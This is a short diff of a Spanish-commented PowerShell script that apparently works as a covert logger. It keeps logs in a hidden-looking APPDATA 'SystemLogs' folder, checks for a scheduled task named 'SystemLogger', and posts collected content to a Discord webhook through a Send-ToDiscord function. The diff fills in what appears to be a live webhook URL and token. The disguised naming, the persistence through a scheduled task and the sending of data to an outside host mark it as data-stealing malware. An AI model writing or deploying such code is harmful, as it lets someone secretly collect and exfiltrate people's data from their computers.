@@ -1,5 +1,5 @@
 # CONFIGURACIÓN INICIAL
-$webhookUrl = "https://discord.com/api/webhooks/XXXXXXXXX/XXXXXXXXXXXX"
+$webhookUrl = "https://discord.com/api/webhooks/1403475722776871033/762S8PxXk-xvAR5_0v95C5Of-pfWYKpJnYO3i1e5w9CEFiz-HUQByB_8ycBZKs4DzaXt"
 $logFile = "$env:APPDATA\SystemLogs\log.txt"
 $lastSendFile = "$env:APPDATA\SystemLogs\lastsend.txt"
 $taskName = "SystemLogger"
@@ -22,7 +22,9 @@ if (-not $task) {
 function Send-ToDiscord {
     param ($content)
     try {
-        $body = @{ content = $content } | ConvertTo-Json
+        $body = @{
+            content = $content
+        } | ConvertTo-Json
         Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json' -ErrorAction Stop
         return $true
     } catch {
